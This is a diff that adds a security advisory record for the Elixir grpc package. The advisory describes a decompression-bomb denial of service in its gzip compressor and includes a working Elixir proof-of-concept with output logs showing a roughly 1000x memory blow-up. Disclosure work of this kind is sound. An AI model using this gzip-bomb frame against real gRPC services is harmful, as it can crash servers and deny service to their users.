@@ -1,0 +1,84 @@
+---
+description: |-
+  ### Summary
+  An unauthenticated remote peer can crash any gRPC server built on this library by sending a small gzip-compressed frame that decompresses to gigabytes, exhausting the BEAM node's heap and triggering an OOM kill (denial of service).
+  
+  Introduced in https://github.com/elixir-grpc/grpc/commit/beae6800fc8baf126f3fe7107d86a50e105275ba
+  
+  ### Details
+  `GRPC.Compressor.Gzip.decompress/1` (lib/grpc/compressor/gzip.ex:12-14) calls `:zlib.gunzip/1` directly on attacker-controlled bytes with no size limit, no ratio check, and no incremental decoding. Because this module is registered as a `GRPC.Compressor` implementation, it is invoked automatically whenever an incoming gRPC frame carries `grpc-encoding: gzip`. `:zlib.gunzip/1` allocates the entire decompressed result as a single binary before returning, so a highly compressible payload (e.g. a few kilobytes of zeros, which gzip compresses at roughly 1000:1) expands to multiple gigabytes inside a single function call. The server's `max_receive_message_length` is enforced only against the already-decompressed message, so it provides no protection here. A single request is sufficient to OOM-kill the node.
+  
+  ### PoC
+  A script that verifies the vulnerability is attached to the end of this report. Run it against a stock gRPC server using this library; the BEAM node's memory usage will balloon and the VM will be OOM-killed after a single request.
+  
+  ### Impact
+  This is a decompression bomb / denial-of-service vulnerability. Any service that exposes a gRPC endpoint built on this library and accepts gzip-compressed requests is affected. No authentication, prior state, or special configuration is required — the attacker only needs to be able to reach the gRPC port and send a single crafted frame with `grpc-encoding: gzip`.
+  
+  ## Scripts and Logs
+  
+  ```elixir
+  # Verifies: Unbounded gzip decompression (decompression bomb)
+  
+  Mix.install([{:grpc, "~> 0.9"}])
+  
+  # Build a gzip bomb: 200 MB of zeros compresses to roughly a few hundred KB.
+  uncompressed_size = 200 * 1024 * 1024
+  bomb_payload = :zlib.gzip(:binary.copy(<<0>>, uncompressed_size))
+  
+  # Wrap the bomb in a gRPC length-prefixed frame with the "compressed" flag (1)
+  # set. This is the exact wire shape an outside peer would put on the socket
+  # for a `grpc-encoding: gzip` message.
+  frame =
+    <<1, byte_size(bomb_payload)::unsigned-integer-32, bomb_payload::binary>>
+  
+  IO.puts(
+    "Compressed bomb: #{byte_size(bomb_payload)} bytes -> claims to expand to #{uncompressed_size} bytes"
+  )
+  
+  :erlang.garbage_collect()
+  mem_before = :erlang.memory(:total)
+  IO.puts("Memory before: #{div(mem_before, 1024 * 1024)} MB")
+  
+  # Public entry point: GRPC.Message.from_data/2 is what the server's request
+  # handling pipeline calls with the raw bytes pulled off an incoming HTTP/2
+  # DATA frame, once it has resolved the encoding header to a compressor module.
+  # An outside attacker controls `frame`; the library is the trust boundary.
+  {:ok, decompressed} =
+    GRPC.Message.from_data(%{compressor: GRPC.Compressor.Gzip}, frame)
+  
+  mem_after = :erlang.memory(:total)
+  IO.puts("Memory after:  #{div(mem_after, 1024 * 1024)} MB")
+  IO.puts("Delta:         #{div(mem_after - mem_before, 1024 * 1024)} MB")
+  IO.puts("Decompressed binary size: #{byte_size(decompressed)} bytes")
+  
+  amplification = byte_size(decompressed) / byte_size(bomb_payload)
+  IO.puts("Amplification ratio: ~#{Float.round(amplification, 1)}x")
+  
+  if byte_size(decompressed) == uncompressed_size do
+    IO.puts(
+      "VERIFIED: GRPC.Message.from_data/2 fully expanded the gzip bomb with no size cap, growing heap by ~#{div(mem_after - mem_before, 1024 * 1024)} MB from a #{div(byte_size(bomb_payload), 1024)} KB attacker payload."
+    )
+  else
+    IO.puts("NOT VERIFIED: decompressed size did not match expected payload")
+  end
+  ```
+  
+  ```logs
+  Compressed bomb: 203860 bytes -> claims to expand to 209715200 bytes
+  Memory before: 45 MB
+  Memory after:  403 MB
+  Delta:         358 MB
+  Decompressed binary size: 209715200 bytes
+  Amplification ratio: ~1028.7x
+  VERIFIED: GRPC.Message.from_data/2 fully expanded the gzip bomb with no size cap, growing heap by ~358 MB from a 199 KB attacker payload.
+  ```
+disclosure_date: 2026-08-25
+first_patched_versions:
+  - 1.0.0
+id: GHSA-6ccx-9c9f-327w
+link: https://github.com/advisories/GHSA-6ccx-9c9f-327w
+package: grpc
+severity: high
+title: gRPC Erlang package has unbounded gzip decompression (decompression bomb)
+vulnerable_version_ranges:
+  - '>= 0.4.0, < 1.0.0'
